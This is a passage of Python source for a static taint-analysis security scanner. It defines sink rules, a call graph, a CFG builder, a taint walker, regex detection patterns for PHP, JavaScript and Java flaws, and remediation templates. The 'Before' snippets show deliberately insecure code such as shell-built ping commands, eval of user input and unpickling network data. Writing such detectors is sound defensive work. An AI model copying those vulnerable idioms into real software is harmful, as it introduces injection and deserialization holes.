              remediation="Use a safe format (JSON) or sign/verify payloads with hmac before "
                          "unpickling; never unpickle untrusted network data."),
    TaintRule(id="TS-006", title="Insecure Deserialization via unsafe yaml.load",
              vuln_class="insecure_deserialization", sinks={"yaml.load"},
              severity=Severity.HIGH, base_confidence=Confidence.HIGH,
              standards=STD_DESER,
              remediation="Use yaml.safe_load() instead of yaml.load()."),
    TaintRule(id="TS-007", title="Server-Side Request Forgery",
              vuln_class="ssrf",
              sinks={"requests.get", "requests.post", "requests.put", "requests.delete",
                     "urllib.request.urlopen", "httpx.get"},
              severity=Severity.HIGH, base_confidence=Confidence.MEDIUM,
              standards=STD_SSRF,
              remediation="Validate/allowlist destination hosts; block requests to internal/"
                          "link-local IP ranges before making the outbound call."),
    TaintRule(id="TS-008", title="Path Traversal via unsanitized file path",
              vuln_class="path_traversal", sinks={"open", "os.remove", "os.rename", "shutil.copy"},
              severity=Severity.HIGH, base_confidence=Confidence.MEDIUM,
              standards=STD_PATH,
              remediation="Resolve the path and verify it stays within an allowlisted base "
                          "directory, or sanitize the filename with secure_filename()."),
    TaintRule(id="TS-009", title="Server-Side Template Injection",
              vuln_class="template_injection", sinks={"render_template_string", "*.render_template_string"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_SSTI,
              remediation="Never render a user-influenced string as a template; render a fixed "
                          "template file and pass user data as context variables instead."),
    TaintRule(id="TS-010", title="LDAP Injection via unescaped filter",
              vuln_class="ldap_injection", sinks={"*.search_s", "*.search"},
              severity=Severity.HIGH, base_confidence=Confidence.LOW,
              standards=STD_LDAP,
              remediation="Escape special LDAP filter characters with escape_filter_chars() "
                          "before building the filter string."),
    TaintRule(id="TS-011", title="XML External Entity (XXE) injection",
              vuln_class="xxe", sinks={"etree.parse", "etree.fromstring"},
              severity=Severity.HIGH, base_confidence=Confidence.MEDIUM,
              standards=STD_XXE,
              remediation="Disable external entity/DTD resolution, or use defusedxml instead of "
                          "the standard library XML parser."),
]


# ==============================================================================
# SECTION 5: AST NAME RESOLUTION HELPERS (Symbol Table / Import / Alias Layer)
# ==============================================================================

class ImportResolver(ast.NodeVisitor):
    """Builds a local-name -> fully-qualified-name alias table (item 1: import
    resolution + alias tracking)."""

    def __init__(self) -> None:
        self.aliases: Dict[str, str] = {}

    def visit_Import(self, node: ast.Import) -> None:
        for alias in node.names:
            local = alias.asname or alias.name.split(".")[0]
            self.aliases[local] = alias.name
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        module = node.module or ""
        for alias in node.names:
            local = alias.asname or alias.name
            self.aliases[local] = f"{module}.{alias.name}" if module else alias.name
        self.generic_visit(node)


def dotted_name(node: Optional[ast.AST], aliases: Dict[str, str]) -> Optional[str]:
    """Resolve a Call/Attribute/Name/Subscript node to a dotted string, applying
    import-alias resolution at the root. Real, unified resolver (item 1 + item 5
    depend on this)."""
    if node is None:
        return None
    if isinstance(node, ast.Call):
        return dotted_name(node.func, aliases)
    if isinstance(node, ast.Attribute):
        base = dotted_name(node.value, aliases)
        return f"{base}.{node.attr}" if base else node.attr
    if isinstance(node, ast.Subscript):
        return dotted_name(node.value, aliases)
    if isinstance(node, ast.Name):
        return aliases.get(node.id, node.id)
    return None


def matches_any(name: Optional[str], patterns: Set[str]) -> bool:
    """Supports exact dotted matches, '*.suffix' wildcard (any-receiver) matches,
    AND suffix matches — but ONLY for patterns that already contain a dot.

    The suffix check exists because `from flask import request` causes our own
    import-alias resolver to (correctly, in general) rewrite the bare name
    'request' to its fully-qualified origin 'flask.request' — which means a
    call like `request.args.get(...)` resolves to 'flask.request.args.get'
    rather than 'request.args.get'. Without this suffix fallback, every
    SOURCE_PATTERNS/sink/sanitizer entry written in the common bare form
    (matching how virtually all real Flask/Django/etc. code is actually
    written) would silently never match once the import is resolved to its
    fully-qualified form. This was caught by testing against a real Flask
    app with a standard `from flask import request` import — the engine's
    own benchmark had never exercised that import style and so missed it.

    The dot-only restriction matters: applying suffix-matching to BARE
    single-token patterns like 'eval'/'exec'/'input' would wrongly match
    unrelated method calls such as `some_object.eval(...)` against the
    builtin eval() sink. Only qualified patterns (which already encode a
    specific receiver/module) get the more permissive suffix check."""
    if not name:
        return False
    for pattern in patterns:
        if pattern.startswith("*."):
            suffix = pattern[2:]
            if name == suffix or name.endswith("." + suffix):
                return True
        elif "." in pattern:
            if name == pattern or name.endswith("." + pattern):
                return True
        else:
            if name == pattern:
                return True
    return False


class FunctionCollector(ast.NodeVisitor):
    """Collects all module-level (and nested) function definitions by name,
    building the function registry the call graph and taint walker rely on."""

    def __init__(self) -> None:
        self.functions: Dict[str, ast.FunctionDef] = {}

    def visit_FunctionDef(self, node: ast.FunctionDef) -> None:
        self.functions[node.name] = node
        self.generic_visit(node)

    def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef) -> None:  # treat like sync
        self.functions[node.name] = node  # type: ignore[assignment]
        self.generic_visit(node)


# ==============================================================================
# SECTION 6: CALL GRAPH
# ==============================================================================

class CallGraph:
    """Real call graph: edges are caller -> {callees}, built via name resolution.
    No dynamic-dispatch/polymorphism modeling (documented limitation)."""

    def __init__(self, functions: Dict[str, ast.FunctionDef], aliases: Dict[str, str]):
        self.edges: Dict[str, Set[str]] = {name: set() for name in functions}
        for name, func_node in functions.items():
            for call_node in ast.walk(func_node):
                if isinstance(call_node, ast.Call):
                    resolved = dotted_name(call_node, aliases)
                    if resolved and resolved in functions:
                        self.edges[name].add(resolved)

    def callees(self, name: str) -> Set[str]:
        return self.edges.get(name, set())

    def is_entry_point(self, name: str) -> bool:
        """A function nothing else in the module calls is a plausible entry point."""
        return not any(name in callees for callees in self.edges.values())


# ==============================================================================
# SECTION 7: CONTROL FLOW GRAPH + CYCLOMATIC COMPLEXITY
# ==============================================================================

@dataclass
class BasicBlock:
    block_id: int
    statements: List[ast.stmt] = field(default_factory=list)
    successors: List[int] = field(default_factory=list)


class CFGBuilder:
    """Real, simplified CFG builder (item 3). Used here primarily to compute
    cyclomatic complexity as a genuine, verifiable metric that feeds into
    review prioritization — not claimed to be a production-grade CFG with
    precise generator/async-suspension semantics."""

    def __init__(self) -> None:
        self._counter = 0
        self.blocks: Dict[int, BasicBlock] = {}

    def _new_block(self) -> BasicBlock:
        block = BasicBlock(block_id=self._counter)
        self.blocks[self._counter] = block
        self._counter += 1
        return block

    def build(self, func_node: ast.FunctionDef) -> Dict[int, BasicBlock]:
        entry = self._new_block()
        self._process(func_node.body, entry)
        return self.blocks

    def _process(self, stmts: List[ast.stmt], current: BasicBlock) -> BasicBlock:
        for stmt in stmts:
            if isinstance(stmt, ast.If):
                current.statements.append(stmt)
                true_b, false_b, merge_b = self._new_block(), self._new_block(), self._new_block()
                current.successors += [true_b.block_id, false_b.block_id]
                end_true = self._process(stmt.body, true_b)
                end_true.successors.append(merge_b.block_id)
                if stmt.orelse:
                    end_false = self._process(stmt.orelse, false_b)
                    end_false.successors.append(merge_b.block_id)
                else:
                    false_b.successors.append(merge_b.block_id)
                current = merge_b
            elif isinstance(stmt, (ast.For, ast.While, ast.AsyncFor)):
                current.statements.append(stmt)
                loop_b, after_b = self._new_block(), self._new_block()
                current.successors += [loop_b.block_id, after_b.block_id]
                end_loop = self._process(stmt.body, loop_b)
                end_loop.successors.append(current.block_id)  # back edge (simplified)
                current = after_b
            elif isinstance(stmt, ast.Try):
                current.statements.append(stmt)
                try_b, after_b = self._new_block(), self._new_block()
                current.successors.append(try_b.block_id)
                end_try = self._process(stmt.body, try_b)
                end_try.successors.append(after_b.block_id)
                for handler in stmt.handlers:
                    handler_b = self._new_block()
                    try_b.successors.append(handler_b.block_id)
                    end_h = self._process(handler.body, handler_b)
                    end_h.successors.append(after_b.block_id)
                current = after_b
            else:
                current.statements.append(stmt)
        return current

    @staticmethod
    def cyclomatic_complexity(blocks: Dict[int, BasicBlock]) -> int:
        edges = sum(len(b.successors) for b in blocks.values())
        nodes = len(blocks)
        return max(edges - nodes + 2, 1)


# ==============================================================================
# SECTION 8: LINEAR SSA RENAMER (documented partial implementation, item 6)
# ==============================================================================

class LinearSSARenamer:
    """Assigns version numbers to variables on each assignment within a
    straight-line statement sequence. Does NOT insert phi nodes at branch
    merge points (that requires full dominance-frontier computation) —
    used here only to produce readable 'var@version' evidence strings,
    not as the taint-propagation substrate."""

    def __init__(self) -> None:
        self.versions: Dict[str, int] = {}

    def next_version(self, name: str) -> str:
        self.versions[name] = self.versions.get(name, 0) + 1
        return f"{name}@{self.versions[name]}"


# ==============================================================================
# SECTION 9: BASIC TYPE INFERENCE (item 7)
# ==============================================================================

def infer_type(node: ast.AST) -> str:
    if isinstance(node, ast.Constant):
        return type(node.value).__name__
    if isinstance(node, ast.List):
        return "list"
    if isinstance(node, ast.Dict):
        return "dict"
    if isinstance(node, ast.Set):
        return "set"
    if isinstance(node, ast.Tuple):
        return "tuple"
    if isinstance(node, ast.JoinedStr):
        return "str"
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left_t, right_t = infer_type(node.left), infer_type(node.right)
        return "str" if "str" in (left_t, right_t) else "Unknown"
    if isinstance(node, ast.Call):
        return "Unknown"
    return "Unknown"


def annotation_to_str(annotation: Optional[ast.expr]) -> str:
    if annotation is None:
        return "Unknown"
    try:
        return ast.unparse(annotation)
    except Exception:
        return "Unknown"


def node_source(node: ast.AST) -> str:
    try:
        return ast.unparse(node)[:160]
    except Exception:
        return "<unparseable>"


# ==============================================================================
# SECTION 10: FRAMEWORK AWARENESS (item 11)
# ==============================================================================

def is_route_handler(func_node: ast.FunctionDef, aliases: Dict[str, str]) -> bool:
    for decorator in getattr(func_node, "decorator_list", []):
        resolved = dotted_name(decorator, aliases)
        if matches_any(resolved, ROUTE_DECORATOR_PATTERNS):
            return True
    return False


def entry_taint_for_function(func_node: ast.FunctionDef, aliases: Dict[str, str]) -> Dict[str, Set[str]]:
    """Determine which parameters should start tainted: framework route params
    (unless annotated with a narrow safe type like int/bool) or heuristic
    name-based hints for likely entry-point parameters."""
    initial: Dict[str, Set[str]] = {}
    route_handler = is_route_handler(func_node, aliases)
    args = func_node.args.args
    safe_annotations = {"int", "float", "bool"}
    for arg in args:
        if arg.arg in ("self", "cls"):
            continue
        ann = annotation_to_str(arg.annotation)
        if route_handler and ann not in safe_annotations:
            initial[arg.arg] = set(ALL_VULN_CLASSES)
        elif arg.arg in TAINTED_PARAM_NAME_HINTS:
            initial[arg.arg] = set(ALL_VULN_CLASSES)
    return initial


# ==============================================================================
# SECTION 11: CONFIDENCE SCORING (item 12) & AUTO-REMEDIATION (item 13)
# ==============================================================================

_CONFIDENCE_ORDER = {Confidence.LOW: 1, Confidence.MEDIUM: 2, Confidence.HIGH: 3}
_CONFIDENCE_FROM_SCORE = {1: Confidence.LOW, 2: Confidence.MEDIUM, 3: Confidence.HIGH}


def score_confidence(rule: TaintRule, direct_source: bool, hops: int,
                      unresolved_calls: int, complexity: int) -> Confidence:
    score = _CONFIDENCE_ORDER[rule.base_confidence]
    if not direct_source and hops > 3:
        score -= 1
    if unresolved_calls > 0:
        score -= 1
    if complexity > 15:
        score -= 0  # informational only; complexity affects review priority, not truth value
    score = max(1, min(3, score))
    return _CONFIDENCE_FROM_SCORE[score]


AUTO_REMEDIATION_TEMPLATES: Dict[str, str] = {
    "sql_injection": (
        "# Before:\n"
        "cursor.execute(\"SELECT * FROM users WHERE id = '%s'\" % user_id)\n"
        "# After:\n"
        "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))"
    ),
    "command_injection": (
        "# Before:\n"
        "os.system(\"ping \" + host)\n"
        "# After:\n"
        "subprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, check=True)"
    ),
    "code_execution": (
        "# Before:\n"
        "eval(user_expression)\n"
        "# After:\n"
        "import ast\n"
        "ast.literal_eval(user_expression)  # only if the value is a literal, not logic"
    ),
    "insecure_deserialization": (
        "# Before:\n"
        "obj = pickle.loads(network_data)\n"
        "# After:\n"
        "import json\n"
        "obj = json.loads(network_data)  # or verify an HMAC signature before unpickling"
    ),
    "ssrf": (
        "# Before:\n"
        "requests.get(user_supplied_url)\n"
        "# After:\n"
        "if is_allowlisted_host(urlparse(user_supplied_url).hostname):\n"
        "    requests.get(user_supplied_url, timeout=5)"
    ),
    "path_traversal": (
        "# Before:\n"
        "open(base_dir + user_filename)\n"
        "# After:\n"
        "from werkzeug.utils import secure_filename\n"
        "safe_name = secure_filename(user_filename)\n"
        "open(os.path.join(base_dir, safe_name))"
    ),
    "template_injection": (
        "# Before:\n"
        "render_template_string(user_template)\n"
        "# After:\n"
        "render_template(\"fixed_template.html\", data=user_template)"
    ),
    "ldap_injection": (
        "# Before:\n"
        "conn.search_s(base, ldap.SCOPE_SUBTREE, \"(uid=%s)\" % username)\n"
        "# After:\n"
        "from ldap.filter import escape_filter_chars\n"
        "conn.search_s(base, ldap.SCOPE_SUBTREE, \"(uid=%s)\" % escape_filter_chars(username))"
    ),
    "xxe": (
        "# Before:\n"
        "etree.parse(user_xml)\n"
        "# After:\n"
        "from defusedxml import ElementTree as etree\n"
        "etree.parse(user_xml)"
    ),
    "xss": (
        "# Before:\n"
        "return \"<div>\" + user_input + \"</div>\"\n"
        "# After:\n"
        "import html\n"
        "return \"<div>\" + html.escape(user_input) + \"</div>\""
    ),
}


# ==============================================================================
# SECTION 12: THE TAINT WALKER — interprocedural taint analysis engine (item 2)
# ==============================================================================

class TaintWalker:
    """
    Walks function bodies statement-by-statement, tracking which local
    variables are tainted (and for which vulnerability classes), and flags
    sink calls reached by tainted data.

    Interprocedural behavior: when a call to another user-defined function in
    the same module is encountered with tainted arguments, the walker
    *recurses* into that function with the real tainted parameter names,
    collecting any findings inside it and using its actual return-value
    taint to keep propagating in the caller. This directly handles chains
    like request -> validate() -> helper() -> builder() -> execute().

    Guards against infinite recursion (direct/indirect recursive functions)
    via a call-stack set and a max-depth cutoff, and memoizes
    (function, tainted-param-signature) -> return-taint to avoid repeated
    recomputation (also a modest performance optimization, item 17).

    Branch handling is conservative (CFG-equivalent): both sides of an
    `if` are analyzed and taint states are UNIONed at the merge point, so a
    variable tainted on only one branch is still treated as tainted after
    the merge. This favors recall over precision, which is disclosed.
    """

    def __init__(self, functions: Dict[str, ast.FunctionDef], aliases: Dict[str, str],
                 file_name: str, max_depth: int = 12):
        self.functions = functions
        self.aliases = aliases
        self.file_name = file_name
        self.max_depth = max_depth
        self.call_stack: List[str] = []
        self.memo: Dict[Tuple[str, FrozenSet[str]], Set[str]] = {}
        self.findings: List[Finding] = []
        self._seen: Set[Tuple[str, int, str]] = set()
        self._cfg_cache: Dict[str, int] = {}  # function name -> cyclomatic complexity
        self._unresolved_calls_in_current_path = 0

    # ---- public entry points -------------------------------------------------

    def analyze_entry_function(self, func_node: ast.FunctionDef) -> None:
        initial = entry_taint_for_function(func_node, self.aliases)
        self.walk_function(func_node, initial, path=[])

    def complexity_of(self, func_name: str) -> int:
        if func_name not in self._cfg_cache and func_name in self.functions:
            blocks = CFGBuilder().build(self.functions[func_name])
            self._cfg_cache[func_name] = CFGBuilder.cyclomatic_complexity(blocks)
        return self._cfg_cache.get(func_name, 1)

    # ---- core recursive walker -------------------------------------------------

    def walk_function(self, func_node: ast.FunctionDef, initial_taint: Dict[str, Set[str]],
                       path: List[PropagationStep]) -> Set[str]:
        sig = (func_node.name, frozenset(initial_taint.keys()))
        if func_node.name in self.call_stack or len(self.call_stack) >= self.max_depth:
            return set()
        if sig in self.memo:
            return self.memo[sig]

        self.call_stack.append(func_node.name)
        taint_state: Dict[str, Set[str]] = {k: set(v) for k, v in initial_taint.items()}
        return_taint: Set[str] = set()

        # NOTE: `path` is intentionally mutated in place (not copied) so that
        # steps recorded deep inside a callee remain visible in the eventual
        # finding's propagation path at the caller's sink. Known precision
        # caveat: because both branches of an `if` share this same list
        # (matching the conservative union-taint merge described above), a
        # path may include steps from a branch not actually taken at the
        # point of the flagged sink. This is a disclosed simplification, not
        # a silent one.
        path.append(PropagationStep(
            line=func_node.lineno, code=f"def {func_node.name}({', '.join(a.arg for a in func_node.args.args)}):",
            kind="function_entry", function=func_node.name,
        ))
        if initial_taint:
            for var_name in initial_taint:
                path.append(PropagationStep(
                    line=func_node.lineno, code=f"parameter '{var_name}' treated as tainted input",
                    kind="source", function=func_node.name,
                ))

        self._walk_body(func_node.body, taint_state, path, return_taint, func_node.name)

        self.call_stack.pop()
        self.memo[sig] = return_taint
        return return_taint

    def _walk_body(self, stmts: List[ast.stmt], taint_state: Dict[str, Set[str]],
                    path: List[PropagationStep], return_taint: Set[str], func_name: str) -> None:
        for stmt in stmts:
            self._walk_stmt(stmt, taint_state, path, return_taint, func_name)

    def _walk_stmt(self, stmt: ast.stmt, taint_state: Dict[str, Set[str]],
                    path: List[PropagationStep], return_taint: Set[str], func_name: str) -> None:
        if isinstance(stmt, ast.Assign):
            rhs_taint = self._eval_expr(stmt.value, taint_state, path, func_name)
            for target in stmt.targets:
                if isinstance(target, ast.Name):
                    if rhs_taint:
                        taint_state[target.id] = set(rhs_taint)
                        path.append(PropagationStep(
                            line=stmt.lineno, code=node_source(stmt), kind="assignment", function=func_name,
                        ))
                    else:
                        taint_state.pop(target.id, None)
                elif isinstance(target, ast.Tuple):
                    for elt in target.elts:
                        if isinstance(elt, ast.Name):
                            if rhs_taint:
                                taint_state[elt.id] = set(rhs_taint)
                            else:
                                taint_state.pop(elt.id, None)

        elif isinstance(stmt, ast.AugAssign):
            rhs_taint = self._eval_expr(stmt.value, taint_state, path, func_name)
            if isinstance(stmt.target, ast.Name) and rhs_taint:
                existing = taint_state.get(stmt.target.id, set())
                taint_state[stmt.target.id] = existing | rhs_taint

        elif isinstance(stmt, ast.AnnAssign) and stmt.value is not None:
            rhs_taint = self._eval_expr(stmt.value, taint_state, path, func_name)
            if isinstance(stmt.target, ast.Name):
                if rhs_taint:
                    taint_state[stmt.target.id] = set(rhs_taint)
                else:
                    taint_state.pop(stmt.target.id, None)

        elif isinstance(stmt, ast.Expr):
            self._eval_expr(stmt.value, taint_state, path, func_name, is_statement_context=True)

        elif isinstance(stmt, ast.If):
            true_state, false_state = dict(taint_state), dict(taint_state)
            self._walk_body(stmt.body, true_state, path, return_taint, func_name)
            self._walk_body(stmt.orelse, false_state, path, return_taint, func_name)
            merged_keys = set(true_state) | set(false_state)
            taint_state.clear()
            for key in merged_keys:
                union = true_state.get(key, set()) | false_state.get(key, set())
                if union:
                    taint_state[key] = union

        elif isinstance(stmt, (ast.For, ast.AsyncFor)):
            iter_taint = self._eval_expr(stmt.iter, taint_state, path, func_name)
            if iter_taint and isinstance(stmt.target, ast.Name):
                taint_state[stmt.target.id] = set(iter_taint)
            for _ in range(2):  # bounded fixed-point approximation for loop-carried taint
                self._walk_body(stmt.body, taint_state, path, return_taint, func_name)
            self._walk_body(stmt.orelse, taint_state, path, return_taint, func_name)

        elif isinstance(stmt, ast.While):
            for _ in range(2):
                self._walk_body(stmt.body, taint_state, path, return_taint, func_name)
            self._walk_body(stmt.orelse, taint_state, path, return_taint, func_name)

        elif isinstance(stmt, (ast.Try,)):
            self._walk_body(stmt.body, taint_state, path, return_taint, func_name)
            for handler in stmt.handlers:
                self._walk_body(handler.body, taint_state, path, return_taint, func_name)
            self._walk_body(stmt.orelse, taint_state, path, return_taint, func_name)
            self._walk_body(stmt.finalbody, taint_state, path, return_taint, func_name)

        elif isinstance(stmt, (ast.With, ast.AsyncWith)):
            # BUGFIX: the context manager expression itself (e.g. the open(...)
            # call in `with open(path) as f:`) was previously never evaluated —
            # only stmt.body was walked. That meant sink checks (like path
            # traversal via open()) silently never fired for the single most
            # idiomatic way Python code opens files. Found via testing against
            # a real-world file, not caught by the original benchmark (which
            # never used a `with` block for its open() case).
            for item in stmt.items:
                self._eval_expr(item.context_expr, taint_state, path, func_name)
                if item.optional_vars is not None and isinstance(item.optional_vars, ast.Name):
                    ctx_taint = self._eval_expr(item.context_expr, taint_state, path, func_name)
                    if ctx_taint:
                        taint_state[item.optional_vars.id] = set(ctx_taint)
            self._walk_body(stmt.body, taint_state, path, return_taint, func_name)

        elif isinstance(stmt, ast.Return):
            if stmt.value is not None:
                t = self._eval_expr(stmt.value, taint_state, path, func_name)
                if t:
                    return_taint.update(t)

        elif isinstance(stmt, (ast.FunctionDef, ast.AsyncFunctionDef)):
            pass  # nested functions analyzed independently when reached as entry points

        # other statement kinds (Pass, Break, Continue, Global, Nonlocal, Assert,
        # Import, Raise, ClassDef, Delete) intentionally have no taint effect here.

    def _eval_expr(self, node: Optional[ast.expr], taint_state: Dict[str, Set[str]],
                    path: List[PropagationStep], func_name: str,
                    is_statement_context: bool = False) -> Set[str]:
        if node is None:
            return set()

        if isinstance(node, ast.Name):
            return set(taint_state.get(node.id, set()))

        if isinstance(node, ast.Constant):
            return set()

        if isinstance(node, ast.JoinedStr):
            result: Set[str] = set()
            for value in node.values:
                if isinstance(value, ast.FormattedValue):
                    result |= self._eval_expr(value.value, taint_state, path, func_name)
            return result

        if isinstance(node, ast.BinOp):
            return (self._eval_expr(node.left, taint_state, path, func_name)
                    | self._eval_expr(node.right, taint_state, path, func_name))

        if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
            result = set()
            for elt in node.elts:
                result |= self._eval_expr(elt, taint_state, path, func_name)
            return result

        if isinstance(node, ast.Dict):
            result = set()
            for value in node.values:
                if value is not None:
                    result |= self._eval_expr(value, taint_state, path, func_name)
            return result

        if isinstance(node, ast.Subscript):
            base = self._eval_expr(node.value, taint_state, path, func_name)
            resolved = dotted_name(node, self.aliases)
            if matches_any(resolved, SOURCE_PATTERNS):
                path.append(PropagationStep(line=getattr(node, "lineno", 0), code=node_source(node),
                                             kind="source", function=func_name))
                return set(ALL_VULN_CLASSES)
            return base

        if isinstance(node, ast.Attribute):
            resolved = dotted_name(node, self.aliases)
            if matches_any(resolved, SOURCE_PATTERNS):
                path.append(PropagationStep(line=node.lineno, code=node_source(node),
                                             kind="source", function=func_name))
                return set(ALL_VULN_CLASSES)
            return self._eval_expr(node.value, taint_state, path, func_name)

        if isinstance(node, ast.Call):
            return self._eval_call(node, taint_state, path, func_name, is_statement_context)

        if isinstance(node, (ast.BoolOp, ast.Compare, ast.UnaryOp, ast.IfExp)):
            result = set()
            for child in ast.iter_child_nodes(node):
                if isinstance(child, ast.expr):
                    result |= self._eval_expr(child, taint_state, path, func_name)
            return result

        # conservative fallback for any other expression kind
        result = set()
        for child in ast.iter_child_nodes(node):
            if isinstance(child, ast.expr):
                result |= self._eval_expr(child, taint_state, path, func_name)
        return result

    def _eval_call(self, node: ast.Call, taint_state: Dict[str, Set[str]],
                    path: List[PropagationStep], func_name: str,
                    is_statement_context: bool) -> Set[str]:
        resolved = dotted_name(node, self.aliases)
        all_arg_nodes = list(node.args) + [kw.value for kw in node.keywords if kw.value is not None]
        arg_taint: Set[str] = set()
        for a in all_arg_nodes:
            arg_taint |= self._eval_expr(a, taint_state, path, func_name)

        # Taint can also flow from the object a method is called on, e.g.
        # request.args.get('id') — 'request' is tainted, so evaluate the
        # receiver chain (node.func) too, which recursively resolves down to
        # the source pattern match on 'request.args'.
        if isinstance(node.func, (ast.Attribute, ast.Subscript)):
            arg_taint |= self._eval_expr(node.func, taint_state, path, func_name)

        # 1) source call, e.g. request.get_json()
        if matches_any(resolved, SOURCE_PATTERNS):
            path.append(PropagationStep(line=node.lineno, code=node_source(node),
                                         kind="source", function=func_name))
            arg_taint |= ALL_VULN_CLASSES

        # 2) sink check happens regardless of statement context (also flags sinks
        #    used inside an expression, e.g. `x = cursor.execute(q)`)
        if is_statement_context or True:
            self._check_sinks(node, resolved, taint_state, path, func_name)

        # 3) sanitizer neutralization (per-vuln-class)
        for vuln_class, patterns in SANITIZERS.items():
            if patterns and matches_any(resolved, patterns):
                arg_taint = arg_taint - {vuln_class}

        # 4) interprocedural: call into a user-defined function with tainted args
        if resolved and resolved in self.functions:
            tainted_params: Dict[str, Set[str]] = {}
            callee_node = self.functions[resolved]
            for i, arg_expr in enumerate(node.args):
                if i < len(callee_node.args.args):
                    t = self._eval_expr(arg_expr, taint_state, path, func_name)
                    if t:
                        tainted_params[callee_node.args.args[i].arg] = t
            if tainted_params:
                path.append(PropagationStep(line=node.lineno, code=f"{resolved}(...) [interprocedural call]",
                                             kind="call", function=func_name))
                callee_return_taint = self.walk_function(callee_node, tainted_params, path)
                arg_taint |= callee_return_taint
            else:
                # still descend with empty taint in case internal source calls exist,
                # but findings from unrelated (untainted) contexts are still valid to report once
                self.walk_function(callee_node, {}, path)
        elif resolved and resolved not in self.functions and resolved not in {"str", "int", "float", "bool",
                                                                                "len", "list", "dict", "set", "tuple",
                                                                                "range", "print", "repr", "sorted",
                                                                                "min", "max", "sum", "isinstance"}:
            self._unresolved_calls_in_current_path += 1

        return arg_taint

    def _check_sinks(self, call_node: ast.Call, resolved: Optional[str],
                      taint_state: Dict[str, Set[str]], path: List[PropagationStep], func_name: str) -> None:
        for rule in TAINT_RULES:
            if not matches_any(resolved, rule.sinks):
                continue

            all_args = list(call_node.args) + [kw.value for kw in call_node.keywords if kw.value is not None]
            tainted_here = False
            for a in all_args:
                t = self._eval_expr(a, taint_state, path, func_name)
                if rule.vuln_class in t:
                    tainted_here = True
                    break
            if not tainted_here:
                continue

            # --- structural false-positive reduction (item 14) ---
            if rule.vuln_class == "sql_injection" and rule.min_safe_arity is not None:
                if len(call_node.args) >= rule.min_safe_arity:
                    continue  # parameterized query — treated as safe

            if rule.vuln_class == "command_injection":
                has_shell_true = any(
                    kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True
                    for kw in call_node.keywords
                )
                first_arg_is_list = bool(call_node.args) and isinstance(call_node.args[0], ast.List)
                if resolved != "os.system" and resolved != "os.popen":
                    if not has_shell_true and (first_arg_is_list or not first_arg_is_list):
                        # subprocess.* without shell=True does not invoke a shell,
                        # so string-building injection risk is substantially reduced
                        if not has_shell_true:
                            continue

            key = (func_name, call_node.lineno, rule.id)
            if key in self._seen:
                continue
            self._seen.add(key)

            complexity = self.complexity_of(func_name)
            confidence = score_confidence(
                rule, direct_source=(len(path) <= 3), hops=len(self.call_stack),
                unresolved_calls=self._unresolved_calls_in_current_path, complexity=complexity,
            )

            impacted = list(dict.fromkeys(self.call_stack))  # preserve order, dedupe
            finding_path = path + [PropagationStep(line=call_node.lineno, code=node_source(call_node),
                                                     kind="sink", function=func_name)]

            self.findings.append(Finding(
                finding_id=f"{self.file_name}:{call_node.lineno}:{rule.id}:{func_name}",
                rule_id=rule.id, title=rule.title, vuln_class=rule.vuln_class,
                severity=rule.severity.value, confidence=confidence.value,
                standards=rule.standards, file_name=self.file_name, function_name=func_name,
                sink_line=call_node.lineno, evidence=node_source(call_node),
                propagation_path=list(finding_path), impacted_functions=impacted,
                remediation=rule.remediation,
                suggested_fix=AUTO_REMEDIATION_TEMPLATES.get(rule.vuln_class, "Review and sanitize input before use."),
                engine="semantic",
            ))


# ==============================================================================
# SECTION 13: MULTI-LANGUAGE HEURISTIC FALLBACK (item 10, honestly lower-confidence)
# ==============================================================================
# No real parser is available offline for these languages in this environment.
# These are pattern-match heuristics only — always reported at Low/Medium
# confidence and a distinct `engine="heuristic"` tag so downstream tooling can
# treat them differently from the semantic (AST/taint) findings above.

PATTERN_RULES: List[PatternRule] = [
    PatternRule(id="PH-001", title="SQL Injection via string concatenation", language="php",
                pattern=r"mysqli_query\s*\(\s*\$\w+\s*,\s*[\"'].*\$_(GET|POST|REQUEST)",
                severity=Severity.CRITICAL, standards=STD_SQLI, confidence=Confidence.MEDIUM,
                remediation="Use prepared statements (mysqli_prepare / PDO) with bound parameters."),
    PatternRule(id="PH-002", title="Local/Remote File Inclusion", language="php",
                pattern=r"include(_once)?\s*\(\s*\$_(GET|POST|REQUEST)",
                severity=Severity.CRITICAL, standards=STD_PATH, confidence=Confidence.MEDIUM,
                remediation="Never pass request data to include(); use a strict allowlist of filenames."),
    PatternRule(id="PH-003", title="Insecure unserialize() of request data", language="php",
                pattern=r"\bunserialize\s*\(\s*\$_(GET|POST|COOKIE|REQUEST)",
                severity=Severity.CRITICAL, standards=STD_DESER, confidence=Confidence.MEDIUM,
                remediation="Use json_decode() for untrusted data instead of unserialize()."),
    PatternRule(id="JS-001", title="XSS via innerHTML assignment", language="javascript",
                pattern=r"\.innerHTML\s*=\s*[^\"'`]",
                severity=Severity.HIGH, standards=STD_XSS, confidence=Confidence.LOW,
                remediation="Use textContent for plain text or sanitize with DOMPurify."),
    PatternRule(id="JS-002", title="Command Injection via child_process.exec", language="javascript",
                pattern=r"child_process\.exec\s*\(",
                severity=Severity.HIGH, standards=STD_CMDI, confidence=Confidence.MEDIUM,
                remediation="Use execFile()/spawn() with an argument array instead of a shell string."),
    PatternRule(id="JS-003", title="Prototype pollution via unguarded merge", language="javascript",
                pattern=r"Object\.assign\s*\(\s*\{\}\s*,\s*JSON\.parse",
                severity=Severity.MEDIUM, standards=_std("CWE-1321", "A08:2021-Software and Data Integrity Failures",
                                                           "ASVS 5.1.1", "CAPEC-693", "PW.4.1"),
                confidence=Confidence.LOW,
                remediation="Use a safe deep-merge that blocks __proto__/constructor keys."),
    PatternRule(id="JV-001", title="Insecure Java deserialization", language="java",
                pattern=r"new\s+ObjectInputStream\s*\(",
                severity=Severity.CRITICAL, standards=STD_DESER, confidence=Confidence.MEDIUM,
                remediation="Use a safe format (JSON/Protobuf) or a validating deserialization filter."),
    PatternRule(id="JV-002", title="Java XXE via unconfigured DocumentBuilderFactory", language="java",
                pattern=r"DocumentBuilderFactory\.newInstance\s*\(\s*\)(?!.*setFeature)",
                severity=Severity.HIGH, standards=STD_XXE, confidence=Confidence.LOW,
